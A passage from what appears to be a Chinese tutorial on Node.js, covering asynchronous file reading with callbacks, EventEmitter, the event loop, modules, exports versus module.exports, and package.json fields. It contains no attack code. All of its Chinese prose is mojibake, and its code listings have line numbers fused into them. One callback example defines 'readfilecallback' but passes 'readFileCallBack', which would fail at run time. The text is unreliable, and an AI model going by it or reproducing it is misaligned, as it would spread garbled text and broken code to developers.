çš„ç¨‹åºè®¾è®¡æ€ç»´ï¼Œå®¹æ˜“è®©æŽ§åˆ¶æµå˜å¾—æ™¦æ¶©éš¾æ‡‚ï¼Œç»™ç¼–ç å’Œè°ƒè¯•éƒ½å¸¦æ¥äº†ä¸å°å›°éš¾ã€‚ ä¸‹è¡¨æ¯”è¾ƒäº†åŒæ­¥å¼ I/O å’Œå¼‚æ­¥å¼ I/O çš„ç‰¹ç‚¹ã€‚ åŒæ­¥I/Oï¼ˆé˜»å¡žå¼ï¼‰ å¼‚æ­¥å¼I/Oï¼ˆéžé˜»å¡žå¼ï¼‰ åˆ©ç”¨å¤šçº¿ç¨‹æä¾›åžåé‡ å•çº¿ç¨‹å³å¯å®žçŽ°é«˜åžåé‡ é€šè¿‡äº‹ä»¶ç‰‡åˆ†å‰²å’Œçº¿ç¨‹è°ƒåº¦åˆ©ç”¨å¤šæ ¸ CPU é€šè¿‡åŠŸèƒ½åˆ’åˆ†åˆ©ç”¨å¤šæ ¸ CPU éœ€è¦æ“ä½œç”±æ“ä½œç³»ç»Ÿè°ƒåº¦å¤šçº¿ç¨‹ä½¿ç”¨å¤šæ ¸ CPU å¯ä»¥å°†å•è¿›ç¨‹ç»‘å®šåˆ°å•æ ¸ CPU éš¾ä»¥å……åˆ†åˆ©ç”¨ CPU èµ„æº å¯ä»¥å……åˆ†åˆ©ç”¨ CPU èµ„æº å†…å­˜è½¨è¿¹å¤§ã€æ•°æ®å±€éƒ¨æ€§å¼± å†…å­˜è½¨è¿¹å°ã€æ•°æ®å±€éƒ¨æ€§å¼º ç¬¦åˆçº¿æ€§çš„ç¼–ç¨‹æ€ç»´ ä¸ç¬¦åˆä¼ ç»Ÿç¼–ç¨‹æ€ç»´ å›žè°ƒå‡½æ•°Node.js ä¸­å¦‚ä½•ä½¿ç”¨å¼‚æ­¥çš„æ–¹å¼è¯»å–ä¸€ä¸ªæ–‡ä»¶ï¼Œä¾‹å­å¦‚ä¸‹ï¼š file.text 1ä½ å¥½å‘€ï¼ 1234567891011// readfile.jsvar fs = require('fs');fs.readFile('file.text', 'utf-8', function(err, data) &#123; if (err) &#123; console.log(err); &#125; else &#123; console.log(data); &#125;&#125;);console.log('end'); è¿è¡Œç»“æžœå¦‚ä¸‹ 12endä½ å¥½å‘€ï¼ Node.js ä¹Ÿæä¾›äº†åŒæ­¥è¯»å–æ–‡ä»¶çš„ API 123456//readfilesync.jsvar fs = require('fs');var data = fs.readFileSync('file.text', 'utf-8');console.log(data);console.log('end'); è¿è¡Œçš„ç»“æžœä¸Žä¸Šä¸€ä¸ªæœ‰ç‚¹ä¸ä¸€æ · 123$ node readfilesync.jsä½ å¥½å‘€ï¼end åŒæ­¥å¼è¯»å–æ–‡ä»¶æ—¶ï¼Œå°†æ–‡ä»¶åä½œä¸ºå‚æ•°ä¼ å…¥ fs.readFileSync å‡½æ•°ï¼Œé˜»å¡žç­‰å¾…è¯»å–å®ŒæˆåŽï¼Œå°†æ–‡ä»¶çš„å†…å®¹ä½œä¸ºå‡½æ•°çš„è¿”å›žå€¼èµ‹ç»™ data å˜é‡ï¼ŒæŽ¥ä¸‹æ¥ï¼ŒæŽ§åˆ¶å°è¾“å‡º data çš„å€¼ï¼Œæœ€åŽè¾“å‡º endã€‚ å¼‚æ­¥å¼è¯»å–æ–‡ä»¶åˆ™æ˜¯ end å…ˆè¢«è¾“å‡ºã€‚fs.readFile æŽ¥å—äº†ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ–‡ä»¶åï¼Œç¬¬äºŒä¸ªæ˜¯ç¼–ç æ–¹å¼ï¼Œç¬¬ä¸‰ä¸ªæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬ç§°è¿™ä¸ªå‡½æ•°ä¸ºå›žè°ƒå‡½æ•°ã€‚ JavaScript æ”¯æŒåŒ¿åçš„å‡½æ•°å®šä¹‰æ–¹å¼ã€‚è¿™ç§å®šä¹‰æ–¹å¼åœ¨ JavaScript ç¨‹åºä¸­æžä¸ºæ™®éï¼Œä¸Žä¸‹é¢è¿™ç§å®šä¹‰æ–¹å¼å®žçŽ°çš„åŠŸèƒ½æ˜¯ä¸€è‡´çš„ï¼š 123456789101112//readfilecallback.jsfunction readfilecallback(err, data) &#123; if (err) &#123; console.log(err); &#125; else &#123; console.log(data); &#125;&#125;var fs = require('fs');fs.readFile('file.text', 'utf-8', readFileCallBack);console.log('end'); fs.readFile è°ƒç”¨æ—¶æ‰€åšçš„å·¥ä½œåªæ˜¯å°†å¼‚æ­¥å¼ I/O è¯·æ±‚å‘é€ç»™äº†æ“ä½œç³»ç»Ÿï¼Œç„¶åŽç«‹å³è¿”å›žå¹¶æ‰§è¡Œäº†åŽé¢çš„è¯­å¥ï¼Œæ‰§è¡Œå®Œä»¥åŽè¿›å…¥äº‹ä»¶å¾ªçŽ¯ç›‘å¬äº‹ä»¶ã€‚å½“ fs æŽ¥å—åˆ°äº† I/O è¯·æ±‚å®Œæˆçš„äº‹ä»¶æ—¶ï¼Œäº‹ä»¶å¾ªçŽ¯ä¼šä¸»åŠ¨è°ƒç”¨å‡½æ•°ä»¥åŽå®ŒæˆåŽç»­å·¥ä½œã€‚å› æ­¤æˆ‘ä»¬ä¼šå…ˆçœ‹åˆ° end ï¼Œç„¶åŽå†çœ‹åˆ° æ–‡ä»¶ä¸­çš„å†…å®¹ã€‚ äº‹ä»¶Node.js æ‰€æœ‰å¼‚æ­¥ I/O æ“ä½œåœ¨å®Œæˆæ—¶éƒ½ä¼šå‘é€ä¸€ä¸ªäº‹ä»¶åˆ°äº‹ä»¶é˜Ÿåˆ—ã€‚äº‹ä»¶ç”± EventEmitter å¯¹è±¡æä¾›ã€‚fs.readFile å’Œ http.createServer çš„å›žè°ƒå‡½æ•°éƒ½æ˜¯é€šè¿‡ EventEmitter æ¥å®žçŽ°çš„ã€‚ 123456789101112// event.js var EventEmitter = require('events').EventEmitter;var event = new EventEmitter();event.on('some_event', function() &#123; console.log('some_event occured.');&#125;)setTimeout(function() &#123; event.emit('some_event');&#125;, 1000); è¿è¡Œè¿™æ®µä»£ç ï¼Œ1ç§’åŽæŽ§åˆ¶å°è¾“å‡ºäº† some_event occured. ã€‚å…¶åŽŸç†æ˜¯ event å¯¹è±¡æ³¨å†Œäº†äº‹ä»¶ some_event çš„ä¸€ä¸ªç›‘å¬å™¨ï¼Œç„¶åŽæˆ‘ä»¬é€šè¿‡ setTimeout åœ¨1000æ¯«ç§’ä»¥åŽå‘event å¯¹è±¡å‘é€äº‹ä»¶ some_event ï¼Œæ­¤æ—¶ä¼šè°ƒç”¨ some_event çš„ç›‘å¬å™¨ã€‚ Node.js çš„äº‹ä»¶å¾ªçŽ¯æœºåˆ¶Node.js åœ¨ä»€ä¹ˆæ—¶å€™ä¼šè¿›å…¥äº‹ä»¶å¾ªçŽ¯å‘¢ï¼Ÿ Node.js ç¨‹åºç”±äº‹ä»¶å¾ªçŽ¯å¼€å§‹ï¼Œç›´åˆ°äº‹ä»¶å¾ªçŽ¯ç»“æŸï¼Œæ‰€æœ‰é€»è¾‘éƒ½æ˜¯äº‹ä»¶çš„å›žè°ƒå‡½æ•°ï¼Œæ‰€ä»¥ Node.js å§‹ç»ˆåœ¨äº‹ä»¶å¾ªçŽ¯ä¸­ï¼Œç¨‹åºå…¥å£å°±æ˜¯äº‹ä»¶å¾ªçŽ¯ç¬¬ä¸€ä¸ªäº‹ä»¶çš„å›žè°ƒå‡½æ•°ã€‚äº‹ä»¶çš„å›žè°ƒå‡½æ•°åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½ä¼šå‘å‡º I/O è¯·æ±‚æˆ–ç›´æŽ¥å‘å°„ï¼ˆemitï¼‰äº‹ä»¶ï¼Œæ‰§è¡Œå®Œæ¯•åŽå†è¿”å›žäº‹ä»¶å¾ªçŽ¯ï¼Œäº‹ä»¶å¾ªçŽ¯ä¼šæ£€æŸ¥äº‹ä»¶é˜Ÿåˆ—ä¸­æœ‰æ²¡æœ‰æœªå¤„ç†çš„äº‹ä»¶ï¼Œç›´åˆ°ç¨‹åºç»“æŸã€‚ä¸‹å›¾è¯´æ˜Žäº†äº‹ä»¶å¾ªçŽ¯çš„åŽŸç†ã€‚ ä¸Žå…¶ä»–è¯­è¨€ä¸åŒçš„æ˜¯ï¼ŒNode.js æ²¡æœ‰æ˜¾å¼çš„äº‹ä»¶å¾ªçŽ¯ã€‚Node.js çš„äº‹ä»¶å¾ªçŽ¯å¯¹å¼€å‘è€…ä¸å¯è§ï¼Œç”± libev åº“å®žçŽ°ã€‚ libevæ”¯æŒå¤šç§ç±»åž‹çš„äº‹ä»¶ï¼Œå¦‚ ev_io ã€ ev_timer ã€ ev_signal ã€ ev_idle ç­‰ï¼Œåœ¨ Node.js ä¸­å‡è¢«EventEmitter å°è£…ã€‚ libev äº‹ä»¶å¾ªçŽ¯çš„æ¯ä¸€æ¬¡è¿­ä»£ï¼Œåœ¨ Node.js ä¸­å°±æ˜¯ä¸€æ¬¡ Tickï¼Œ libev ä¸æ–­æ£€æŸ¥æ˜¯å¦æœ‰æ´»åŠ¨çš„ã€å¯ä¾›æ£€æµ‹çš„äº‹ä»¶ç›‘å¬å™¨ï¼Œç›´åˆ°æ£€æµ‹ä¸åˆ°æ—¶æ‰é€€å‡ºäº‹ä»¶å¾ªçŽ¯ï¼Œè¿›ç¨‹ç»“æŸã€‚ æ¨¡å—å’ŒåŒ…æ¨¡å—ï¼ˆModuleï¼‰å’ŒåŒ…ï¼ˆPackageï¼‰æ˜¯ Node.js æœ€é‡è¦çš„æ”¯æŸ±ã€‚å¼€å‘ä¸€ä¸ªå…·æœ‰ä¸€å®šè§„æ¨¡çš„ç¨‹åºä¸å¯èƒ½åªç”¨ä¸€ä¸ªæ–‡ä»¶ï¼Œé€šå¸¸éœ€è¦æŠŠå„ä¸ªåŠŸèƒ½æ‹†åˆ†ã€å°è£…ï¼Œç„¶åŽç»„åˆèµ·æ¥ï¼Œæ¨¡å—æ­£æ˜¯ä¸ºäº†å®žçŽ°è¿™ç§æ–¹å¼è€Œè¯žç”Ÿçš„ã€‚åœ¨æµè§ˆå™¨ JavaScript ä¸­ï¼Œè„šæœ¬æ¨¡å—çš„æ‹†åˆ†å’Œç»„åˆé€šå¸¸ä½¿ç”¨ HTML çš„script æ ‡ç­¾æ¥å®žçŽ°ã€‚Node.js æä¾›äº† require å‡½æ•°æ¥è°ƒç”¨å…¶ä»–æ¨¡å—ï¼Œè€Œä¸”æ¨¡å—éƒ½æ˜¯åŸºäºŽæ–‡ä»¶çš„ï¼Œæœºåˆ¶ååˆ†ç®€å•ã€‚Node.js çš„æ¨¡å—å’ŒåŒ…æœºåˆ¶çš„å®žçŽ°å‚ç…§äº† CommonJS çš„æ ‡å‡†ï¼Œä½†å¹¶æœªå®Œå…¨éµå¾ªã€‚ä¸è¿‡ä¸¤è€…çš„åŒºåˆ«å¹¶ä¸å¤§ã€‚åªæœ‰è¯•å›¾åˆ¶ä½œä¸€ä¸ªé™¤äº†æ”¯æŒ Node.jsä¹‹å¤–è¿˜è¦æ”¯æŒå…¶ä»–å¹³å°çš„æ¨¡å—æˆ–åŒ…çš„æ—¶å€™æ‰éœ€è¦ä»”ç»†ç ”ç©¶ã€‚é€šå¸¸ï¼Œä¸¤è€…æ²¡æœ‰ç›´æŽ¥å†²çªçš„åœ°æ–¹ã€‚ æˆ‘ä»¬ç»å¸¸æŠŠ Node.js çš„æ¨¡å—å’ŒåŒ…ç›¸æå¹¶è®ºï¼Œå› ä¸ºæ¨¡å—å’ŒåŒ…æ˜¯æ²¡æœ‰æœ¬è´¨åŒºåˆ«çš„ï¼Œä¸¤ä¸ªæ¦‚å¿µä¹Ÿæ—¶å¸¸æ··ç”¨ã€‚å¦‚æžœè¦è¾¨æžï¼Œé‚£ä¹ˆå¯ä»¥æŠŠåŒ…ç†è§£æˆæ˜¯å®žçŽ°äº†æŸä¸ªåŠŸèƒ½æ¨¡å—çš„é›†åˆï¼Œç”¨äºŽå‘å¸ƒå’Œç»´æŠ¤ã€‚å¯¹ä½¿ç”¨è€…æ¥è¯´ï¼Œæ¨¡å—å’ŒåŒ…çš„åŒºåˆ«æ˜¯é€æ˜Žçš„ï¼Œå› æ­¤ç»å¸¸ä¸ä½œåŒºåˆ†ã€‚ ä»€ä¹ˆæ˜¯æ¨¡å—æ¨¡å—æ˜¯ Node.js åº”ç”¨ç¨‹åºçš„åŸºæœ¬ç»„æˆéƒ¨åˆ†ï¼Œæ–‡ä»¶å’Œæ¨¡å—æ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚æ¢è¨€ä¹‹ï¼Œä¸€ä¸ªNode.js æ–‡ä»¶å°±æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œè¿™ä¸ªæ–‡ä»¶å¯èƒ½æ˜¯ JavaScript ä»£ç ã€JSON æˆ–è€…ç¼–è¯‘è¿‡çš„ C/C++ æ‰©å±•ã€‚ åœ¨å‰é¢ä¾‹å­ä¸­ï¼Œæ›¾ç»ç”¨åˆ°äº† var http = require(â€˜httpâ€™)ï¼Œ å…¶ä¸­ httpæ˜¯ Node.js çš„ä¸€ä¸ªæ ¸å¿ƒæ¨¡å—ï¼Œå…¶å†…éƒ¨æ˜¯ç”¨ C++ å®žçŽ°çš„ï¼Œå¤–éƒ¨ç”¨ JavaScript å°è£…ã€‚æˆ‘ä»¬é€šè¿‡require å‡½æ•°èŽ·å–äº†è¿™ä¸ªæ¨¡å—ï¼Œç„¶åŽæ‰èƒ½ä½¿ç”¨å…¶ä¸­çš„å¯¹è±¡ã€‚ åˆ›å»ºåŠåŠ è½½æ¨¡å—åˆ›å»ºæ¨¡å—Node.js ä¸­ï¼Œä¸€ä¸ªæ–‡ä»¶å°±æ˜¯ä¸€ä¸ªæ¨¡å—ï¼ŒNode.jsæä¾›äº† exports å’Œ require ä¸¤ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­ exports æ˜¯æ¨¡å—å…¬å¼€çš„æŽ¥å£ï¼Œ require ç”¨äºŽä»Žå¤–éƒ¨èŽ·å–ä¸€ä¸ªæ¨¡å—çš„å³å¯æ¬§ï¼Œå³èŽ·å–æ¨¡å—çš„ exports å¯¹è±¡ã€‚ åˆ›å»ºä¸€ä¸ª module.js æ–‡ä»¶ã€‚ 123456789// module.jsvar name;exports.setName = function(thyName) &#123; name = thyName;&#125;exports.sayHello = function() &#123; console.log('Hello ' + name);&#125; åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œåˆ›å»ºä¸€ä¸ª getmodule.js 12345// getmodule.jsvar myModule = require('./module');myModule.setName('NodeJs');myModule.sayHello(); è¿è¡Œnode getmodule.jsï¼Œç»“æžœæ˜¯ï¼š 1Hello NodeJs åœ¨ä»¥ä¸Šç¤ºä¾‹ä¸­ï¼Œmodule.js é€šè¿‡ exports å¯¹è±¡æŠŠ setName å’Œ sayHello ä½œä¸ºæ¨¡å—çš„è®¿é—®æŽ¥å£ï¼Œåœ¨ getmodule.js ä¸­é€šè¿‡ require(&#39;./module&#39;) åŠ è½½è¿™ä¸ªæ¨¡å—ï¼Œç„¶åŽå°±å¯ä»¥ç›´æŽ¥è®¿é—® module.js ä¸­ exports å¯¹è±¡çš„æˆå‘˜å‡½æ•°äº†ã€‚ è¿™ç§æŽ¥å£å°è£…æ–¹å¼æ¯”è®¸å¤šè¯­è¨€è¦ç®€æ´å¾—å¤šï¼ŒåŒæ—¶ä¹Ÿä¸å¤±ä¼˜é›…ï¼Œæœªå¼•å…¥è¿åè¯­ä¹‰çš„ç‰¹æ€§ï¼Œç¬¦åˆä¼ ç»Ÿçš„ç¼–ç¨‹é€»è¾‘ã€‚åœ¨è¿™ä¸ªåŸºç¡€ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥æž„å»ºå¤§åž‹çš„åº”ç”¨ç¨‹åºï¼Œnpm æä¾›çš„ä¸Šä¸‡ä¸ªæ¨¡å—éƒ½æ˜¯é€šè¿‡è¿™ç§ç®€å•çš„æ–¹å¼æ­å»ºèµ·æ¥çš„ã€‚ å•æ¬¡åŠ è½½ä¸Šé¢è¿™ä¸ªä¾‹å­æœ‰ç‚¹ç±»ä¼¼äºŽåˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œä½†å®žé™…ä¸Šå’Œå¯¹è±¡åˆæœ‰æœ¬è´¨çš„åŒºåˆ«ï¼Œå› ä¸º require ä¸ä¼šé‡å¤åŠ è½½æ¨¡å—ï¼Œä¹Ÿå°±æ˜¯è¯´æ— è®ºè°ƒç”¨å¤šå°‘æ¬¡ requireï¼Œ èŽ·å¾—çš„æ¨¡å—éƒ½æ˜¯åŒä¸€ä¸ªã€‚åœ¨ getmodule.js çš„åŸºç¡€ä¸Šç¨ä½œä¿®æ”¹ï¼š 123456//loadmodule.jsvar hello1 = require('./module');hello1.setName('NAME 1');var hello2 = require('./module');hello2.setName('NAME 2');hello1.sayHello(); è¿è¡ŒåŽå‘çŽ°è¾“å‡ºç»“æžœæ˜¯ NAME 2 ï¼Œè¿™æ˜¯å› ä¸ºå˜é‡ hello1 å’Œ hello2 æŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªå®žä¾‹ï¼Œå› æ­¤ hello1.setName çš„ç»“æžœè¢« hello2.setName è¦†ç›–ï¼Œæœ€ç»ˆè¾“å‡ºç»“æžœæ˜¯ç”±åŽè€…å†³å®šçš„ã€‚ è¦†ç›– exportsæœ‰æ—¶å€™æˆ‘ä»¬åªæ˜¯æƒ³æŠŠä¸€ä¸ªå¯¹è±¡å°è£…åˆ°æ¨¡å—ä¸­ï¼Œä¾‹å¦‚ï¼š 1234567891011//singleobject.jsfunction Hello() &#123; var name; this.setName = function(thyName) &#123; name = thyName; &#125;; this.sayHello = function() &#123; console.log('Hello ' + name); &#125;;&#125;;exports.Hello = Hello; æ­¤æ—¶æˆ‘ä»¬åœ¨å…¶ä»–æ–‡ä»¶ä¸­éœ€è¦é€šè¿‡ require(â€˜./singleobjectâ€™).Hello æ¥èŽ·å–Hello å¯¹è±¡ï¼Œè¿™ç•¥æ˜¾å†—ä½™ï¼Œå¯ä»¥ç”¨ä¸‹é¢æ–¹æ³•ç¨å¾®ç®€åŒ–ï¼š 123456789101112//hello.jsfunction Hello() &#123; var name; this.setName = function(thyName) &#123; name = thyName; &#125;; this.sayHello = function() &#123; console.log('Hello ' + name); &#125;;&#125;;module.exports = Hello; è¿™æ ·å°±å¯ä»¥ç›´æŽ¥èŽ·å¾—è¿™ä¸ªå¯¹è±¡äº† 12345//gethello.jsvar Hello = require('./hello');hello = new Hello();hello.setName('NAME 3');hello.sayHello(); æ³¨æ„ï¼Œæ¨¡å—æŽ¥å£çš„å”¯ä¸€å˜åŒ–æ˜¯ä½¿ç”¨ module.exports = Hello ä»£æ›¿äº† exports.Hello=Hello ã€‚åœ¨å¤–éƒ¨å¼•ç”¨è¯¥æ¨¡å—æ—¶ï¼Œå…¶æŽ¥å£å¯¹è±¡å°±æ˜¯è¦è¾“å‡ºçš„ Hello å¯¹è±¡æœ¬èº«ï¼Œè€Œä¸æ˜¯åŽŸå…ˆçš„exports ã€‚ äº‹å®žä¸Šï¼Œ exports æœ¬èº«ä»…ä»…æ˜¯ä¸€ä¸ªæ™®é€šçš„ç©ºå¯¹è±¡ï¼Œå³ {} ï¼Œå®ƒä¸“é—¨ç”¨æ¥å£°æ˜ŽæŽ¥å£ï¼Œæœ¬è´¨ä¸Šæ˜¯é€šè¿‡å®ƒä¸ºæ¨¡å—é—­åŒ…çš„å†…éƒ¨å»ºç«‹äº†ä¸€ä¸ªæœ‰é™çš„è®¿é—®æŽ¥å£ã€‚å› ä¸ºå®ƒæ²¡æœ‰ä»»ä½•ç‰¹æ®Šçš„åœ°æ–¹ï¼Œæ‰€ä»¥å¯ä»¥ç”¨å…¶ä»–ä¸œè¥¿æ¥ä»£æ›¿ï¼Œå¦‚ä¸Šé¢ä¾‹å­ä¸­çš„ Hello å¯¹è±¡ã€‚ ä¸å¯ä»¥é€šè¿‡å¯¹ exports ç›´æŽ¥èµ‹å€¼ä»£æ›¿å¯¹ module.exports èµ‹å€¼ã€‚exports å®žé™…ä¸Šåªæ˜¯ä¸€ä¸ªå’Œ module.exports æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡çš„å˜é‡ï¼Œå®ƒæœ¬èº«ä¼šåœ¨æ¨¡å—æ‰§è¡Œç»“æŸåŽé‡Šæ”¾ï¼Œä½† module ä¸ä¼šï¼Œå› æ­¤åªèƒ½é€šè¿‡æŒ‡å®šmodule.exports æ¥æ”¹å˜è®¿é—®æŽ¥å£ã€‚ åˆ›å»ºåŒ…åŒ…æ˜¯åœ¨æ¨¡å—åŸºç¡€ä¸Šæ›´æ·±ä¸€æ­¥çš„æŠ½è±¡ï¼ŒNode.js çš„åŒ…ç±»ä¼¼äºŽ C/C++ çš„å‡½æ•°åº“æˆ–è€… Java/.Net çš„ç±»åº“ã€‚å®ƒå°†æŸä¸ªç‹¬ç«‹çš„åŠŸèƒ½å°è£…èµ·æ¥ï¼Œç”¨äºŽå‘å¸ƒã€æ›´æ–°ã€ä¾èµ–ç®¡ç†å’Œç‰ˆæœ¬æŽ§åˆ¶ã€‚Node.js æ ¹æ® CommonJS è§„èŒƒå®žçŽ°äº†åŒ…æœºåˆ¶ï¼Œå¼€å‘äº† npm æ¥è§£å†³åŒ…çš„å‘å¸ƒå’ŒèŽ·å–éœ€æ±‚ã€‚ Node.js çš„åŒ…æ˜¯ä¸€ä¸ªç›®å½•ï¼Œå…¶ä¸­åŒ…å«äº†ä¸€ä¸ª JSON æ ¼å¼çš„åŒ…è¯´æ˜Žæ–‡ä»¶ package.json ã€‚ä¸¥æ ¼ç¬¦åˆ CommonJS è§„èŒƒçš„åŒ…åº”è¯¥å…·å¤‡ä»¥ä¸‹ç‰¹å¾ã€‚ package.json å¿…é¡»åœ¨åŒ…çš„ç›®å½•ä¸‹ï¼› äºŒè¿›åˆ¶æ–‡ä»¶åº”è¯¥åœ¨ bin ç›®å½•ä¸‹ï¼› JavaScript ä»£ç åº”è¯¥åœ¨ lib ç›®å½•ä¸‹ æ–‡æ¡£åº”è¯¥åœ¨ doc ç›®å½•ä¸‹ å•å…ƒæµ‹è¯•åº”è¯¥åœ¨ test ç›®å½•ä¸‹ Node.js å¯¹åŒ…çš„è¦æ±‚å¹¶æ²¡æœ‰è¿™ä¹ˆä¸¥æ ¼ã€‚åªè¦é¡¶å±‚ç›®å½•ä¸‹æœ‰ä¸€ä¸ª package.jsonï¼Œå¹¶ç¬¦åˆä¸€äº›è§„èŒƒå³å¯ã€‚å½“ç„¶ä¸ºäº†æé«˜å…¼å®¹æ€§ï¼Œè¿˜æ˜¯å»ºè®®åœ¨åˆ¶ä½œåŒ…çš„æ—¶å€™ï¼Œä¸¥æ ¼éµå®ˆ CommonJS è§„èŒƒã€‚ ä½œä¸ºæ–‡ä»¶å¤¹çš„æ¨¡å—æ¨¡å—ä¸Žæ–‡ä»¶æ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚æ–‡ä»¶ä¸ä»…å¯ä»¥æ˜¯ JavaScript ä»£ç æˆ–äºŒè¿›åˆ¶ä»£ç ï¼Œè¿˜å¯ä»¥æ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹ã€‚æœ€ç®€å•çš„åŒ…ï¼Œå°±æ˜¯ä¸€ä¸ªä½œä¸ºæ–‡ä»¶å¤¹çš„æ¨¡å—ã€‚ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼Œå»ºç«‹ä¸€ä¸ªå«åš somepackage çš„æ–‡ä»¶å¤¹ï¼Œåœ¨å…¶ä¸­åˆ›å»º index.jsï¼Œå†…å®¹å¦‚ä¸‹ï¼š 12345//somepackage/index.jsexports.hello = function() &#123; console.log('Hello.');&#125; ç„¶åŽåœ¨ somepackage ä¹‹å¤–å»ºç«‹ getpackage.js å†…å®¹å¦‚ä¸‹ï¼š 1234// getpackage.jsvar somePackage = require('./somepackage');somePackage.hello(); è¿è¡Œ node getpackage.jsï¼ŒæŽ§åˆ¶å°å°†è¾“å‡ºç»“æžœ Hello. ã€‚ ä½¿ç”¨è¿™ç§æ–¹æ³•å¯ä»¥æŠŠæ–‡ä»¶å¤¹å°è£…ä¸ºä¸€ä¸ªæ¨¡å—ï¼Œå³æ‰€è°“çš„åŒ…ã€‚åŒ…é€šå¸¸æ˜¯ä¸€äº›æ¨¡å—çš„é›†åˆï¼Œåœ¨æ¨¡å—çš„åŸºç¡€ä¸Šæä¾›äº†æ›´é«˜å±‚çš„æŠ½è±¡ï¼Œç›¸å½“äºŽæä¾›äº†ä¸€äº›å›ºå®šæŽ¥å£çš„å‡½æ•°åº“ã€‚é€šè¿‡å®šåˆ¶package.jsonï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºæ›´å¤æ‚ã€æ›´å®Œå–„ã€æ›´ç¬¦åˆè§„èŒƒçš„åŒ…ç”¨äºŽå‘å¸ƒã€‚ package.jsonåœ¨somepackage æ–‡ä»¶å¤¹ä¸‹ï¼Œåˆ›å»ºä¸€ä¸ªå«åš package.json çš„æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹: 123&#123; "main": "./lib/interface.js"&#125; ç„¶åŽå°† index.js é‡å‘½åä¸º interface.js å¹¶æ”¾å…¥ lib æ–‡ä»¶å¤¹ä¸‹é¢ã€‚ä»¥åŒæ ·çš„æ–¹å¼å†æ¬¡è°ƒç”¨è¿™ä¸ªåŒ…ï¼Œä¾ç„¶å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚ Node.js åœ¨è°ƒç”¨æŸä¸ªåŒ…æ—¶ï¼Œä¼šé¦–å…ˆæ£€æŸ¥åŒ…ä¸­ package.json æ–‡ä»¶çš„ main å­—æ®µï¼Œå°†å…¶ä½œä¸ºåŒ…çš„æŽ¥å£æ¨¡å—ï¼Œå¦‚æžœ package.json æˆ– main å­—æ®µä¸å­˜åœ¨ï¼Œä¼šå°è¯•å¯»æ‰¾ index.js æˆ– index.node ä½œä¸ºåŒ…çš„æŽ¥å£ã€‚ package.json æ˜¯ CommonJS è§„å®šçš„ç”¨æ¥æè¿°åŒ…çš„æ–‡ä»¶ï¼Œå®Œå…¨ç¬¦åˆè§„èŒƒçš„ package.json æ–‡ä»¶åº”è¯¥å«æœ‰ä»¥ä¸‹å­—æ®µã€‚ nameï¼šåŒ…çš„åç§°ï¼Œå¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œç”±å°å†™è‹±æ–‡ã€æ•°å­—å’Œä¸‹åˆ’çº¿ç»„æˆï¼Œä¸èƒ½åŒ…å«ç©ºæ ¼ã€‚ descriptionï¼šåŒ…çš„ç®€è¦è¯´æ˜Žã€‚ versionï¼šç¬¦åˆè¯­ä¹‰åŒ–ç‰ˆæœ¬è¯†åˆ«è§„èŒƒçš„ç‰ˆæœ¬å­—ç¬¦ä¸²ã€‚ keywordsï¼šå…³é”®å­—æ•°ç»„ï¼Œé€šå¸¸ç”¨äºŽæœç´¢ã€ maintainersï¼šç»´æŠ¤è€…æ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´ è¦åŒ…å« nameã€emailï¼ˆå¯é€‰ï¼‰ã€webï¼ˆå¯é€‰ï¼‰å­—æ®µã€‚ contributionsï¼šè´¡çŒ®è€…æ•°ç»„ï¼Œæ ¼å¼å’Œ maintainers ç›¸åŒã€‚åŒ…çš„ä½œè€…åº”è¯¥æ˜¯è´¡çŒ®è€…æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ bugsï¼šæäº¤ bug çš„åœ°å€ï¼Œå¯ä»¥æ˜¯ç½‘å€æˆ–è€…æ˜¯ç”µå­é‚®ä»¶åœ°å€ã€‚ licenseï¼šè®¸å¯è¯æ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´ è¦åŒ…å« typeï¼ˆè®¸å¯è¯çš„åç§°ï¼‰å’Œ url ï¼ˆé“¾æŽ¥åˆ°è®¸å¯è¯æ–‡æœ¬çš„åœ°å€ï¼‰å­æ®µã€‚ respositoriesï¼šä»“åº“æ‰˜ç®¡åœ°å€æ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´ è¦åŒ…å« type ï¼ˆä»“åº“çš„ç±»åž‹ï¼Œå¦‚ gitï¼‰ã€urlï¼ˆä»“åº“çš„åœ°å€ï¼‰å’Œ pathï¼ˆç›¸å¯¹äºŽä»“åº“çš„è·¯å¾„ï¼Œå¯é€‰ï¼‰å­—æ®µã€‚ dependenciesï¼šåŒ…çš„ä¾èµ–ï¼Œä¸€ä¸ªå…³è”æ•°ç»„ï¼Œç”±åŒ…åç§°å’Œç‰ˆæœ¬å·ç»„æˆã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªå®Œå…¨ç¬¦åˆ CommonJS è§„èŒƒçš„ package.json ç¤ºä¾‹ï¼š 123456789101112131415161718192021222324252627282930313233343536&#123; "name": "mypackage", "description": "Sample package for CommonJS. This package demonstrates the required elements of a CommonJS package.", "version": "0.7.0", "keywords": [ "package", "example" ], "maintainers": [&#123; "name": "Bill Smith", "email": "bills@example.com", &#125;], "contributors": [&#123; "name": "BYVoid", "web": "http://www.byvoid.com/" &#125;], "bugs": &#123; "mail": "dev@example.com", "web": "http://www.example.com/bugs" &#125;, "licenses": [&#123; "type": "GPLv2", "url": "http://www.example.org/licenses/gpl.html" &#125;], "repositories": [&#123; "type": "git", "url": "http://github.com/BYVoid/mypackage.git" &#125;], "dependencies": &#123; "webkit": "1.2", "ssl": &#123; 